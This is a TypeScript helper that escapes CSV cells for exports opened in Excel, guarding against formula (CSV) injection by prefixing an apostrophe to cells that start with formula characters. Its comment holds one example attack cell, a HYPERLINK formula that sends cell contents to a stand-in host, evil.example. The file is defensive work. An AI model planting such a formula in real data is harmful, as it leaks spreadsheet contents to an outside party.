// CSV cells for the exports (`;`-separated, opened as-is in a Bulgarian Excel).
// A text cell that starts with = + - @ (or a tab / carriage return) is a formula to Excel: a partner
// named `=HYPERLINK("https://evil.example/?"&C3&D3;…)` would run in the finance team's batch report.
// Such a cell gets a leading apostrophe, so it is shown as text (OWASP "CSV injection"). Plain
// numbers (‹-12,50›, ‹1450,00›, ‹120›) stay numbers.

const FORMULA_START = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^-?\d+(?:[.,]\d+)?$/;

export function csvCell(v: string | number | null | undefined): string {
  let s = v === null || v === undefined ? '' : String(v);
  if (FORMULA_START.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`;
  return /[;"\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
